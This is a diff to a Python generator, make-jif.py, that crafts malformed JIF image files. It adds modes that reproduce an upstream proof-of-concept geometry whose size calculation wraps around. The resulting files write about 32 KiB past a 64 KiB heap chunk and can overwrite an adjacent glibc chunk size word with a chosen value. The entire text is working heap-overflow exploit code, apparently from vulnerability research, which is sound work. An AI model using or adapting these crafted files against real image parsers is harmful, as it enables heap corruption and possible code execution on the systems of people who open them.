@@ -13,14 +13,18 @@ Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
                         published-hex HEXSTRING | published-mix IN OUT |
                         published-ptr | safe HEXBYTE |
                         minimal-size | minimal-ptr HEXADDR |
-                        minimal-noob HEXBYTE)
-
+                        minimal-noob HEXBYTE | large HEXBYTE |
+                        large-run N HEXBYTE | large-hex HEXSTRING |
+                        large-size HEXADDR)
 `minimal-size` and `minimal-ptr` keep the 40-byte minimal-geometry zlib
 payload but preserve the adjacent glibc chunk size word at indexes+24
 (0x41), changing only that chunk's first user word at +32. They isolate
 chunk-metadata corruption from chosen-pointer use; they claim no deref.
 `minimal-noob` writes only `data_size` bytes: same wrapped geometry, no OOB
-write, control for the terminal fault's cause.
+`large` reproduces the second upstream PoC geometry (65535x32769,
+product `0x80007fff`, alpha `data_size=65534`) and writes ~32 KiB past
+the 64 KiB `indexes` chunk; `large-run` and `large-hex` vary that span.
+`large-size` preserves the adjacent free chunk size word at `indexes+65544`.
 """
 import struct
 import sys
@@ -66,6 +70,24 @@ elif kind in ("minimal-size", "minimal-ptr"):
     plain = b"\x4d" * 24 + struct.pack("<Q", 0x41) + struct.pack("<Q", word)
 elif kind == "minimal-noob":
     plain = bytes([int(sys.argv[3], 16)]) * 4
+elif kind == "large-size":
+    LEN, HEIGHT = 65535, 32769
+    plain = bytearray(b"\x4d" * (65534 + 32773))
+    plain[65544:65552] = struct.pack("<Q", int(sys.argv[3], 16))
+    plain = bytes(plain)
+elif kind in ("large", "large-run", "large-hex"):
+    LEN, HEIGHT = 65535, 32769
+    if kind == "large-hex":
+        plain = bytes.fromhex(sys.argv[3])
+    else:
+        if kind == "large-run":
+            nbytes = int(sys.argv[3])
+            byte = int(sys.argv[4], 16)
+        else:
+            nbytes = 65534 + 32773
+            byte = int(sys.argv[3], 16)
+        assert 65534 <= nbytes <= 0x8001ffff
+        plain = bytes([byte]) * nbytes
 else:
     raise SystemExit("unknown mode")
 if kind in ("bytes", "ptr", "minimal-size", "minimal-ptr", "minimal-noob"):
@@ -75,6 +97,9 @@ elif kind in ("published", "published-long", "published-mix",
               "published-run", "published-ptr", "published-hex"):
     assert LEN * HEIGHT == 0x80000082
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 260
+elif kind in ("large", "large-run", "large-hex", "large-size"):
+    assert LEN * HEIGHT == 0x80007fff
+    assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 65534
 gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
 z = zlib.compress(plain, 9)
 chunks = b"".join(bytes([len(z[i:i + 255])]) + z[i:i + 255]
